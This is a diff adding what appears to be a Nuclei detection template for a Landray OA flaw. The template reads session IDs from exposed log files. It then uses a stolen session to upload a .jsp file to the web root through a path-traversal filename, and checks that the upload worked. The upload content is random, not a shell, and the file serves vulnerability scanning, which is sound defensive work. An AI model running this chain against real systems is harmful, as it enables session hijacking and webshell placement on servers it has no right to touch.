@@ -1,0 +1,90 @@
+id: landray-oa-session-disclosure-file-upload
+
+info:
+  name: Landray OA Session Disclosure and Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The attacker uses the logic of setting `/ui-ext/` to be empty when processing the path through OA to read the session through the directory and uses the arbitrarily obtained session to upload any file to obtain the webshell.
+  tags: file-upload, oast
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+variables:
+  rand_filename: "{{rand_base(6)}}.jsp"
+  rand_content: "{{rand_base(16)}}"
+
+http:
+  - id: get-log-file-name
+    method: GET
+    path:
+      - "{{BaseURL}}/ui-ext/behavior/"
+    extractors:
+      - type: regex
+        name: log_filename
+        internal: true
+        regex:
+          - "(.*?\\.log.*?)\\n?"
+        group: 1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.log"
+
+  - id: fetch-session-id
+    method: GET
+    path:
+      - "{{BaseURL}}/ui-ext/behavior/{{log_filename}}"
+    extractors:
+      - type: regex
+        name: jsessionid
+        internal: true
+        regex:
+          - "\\d\\t([A-F\\d]{32})\\t.*\\n$"
+        group: 1
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[A-F\\d]{32}"
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/sys/mutillang/import.do?method=excelImport"
+    headers:
+      Cookie: "JSESSIONID={{jsessionid}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryBJHAAbia048HXMZE"
+    body: |
+      ------WebKitFormBoundaryBJHAAbia048HXMZE\r\n
+      Content-Disposition: form-data; name="initfile"; filename="/../../../../../ekp/{{rand_filename}}"\r\n
+      Content-Type: application/zip\r\n\r\n
+      {{rand_content}}\r\n
+      ------WebKitFormBoundaryBJHAAbia048HXMZE--\r\n
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/sys/mutillang/import.do?method=excelImport"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{rand_filename}}"
+    headers:
+      Cookie: "JSESSIONID={{jsessionid}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand_content}}"
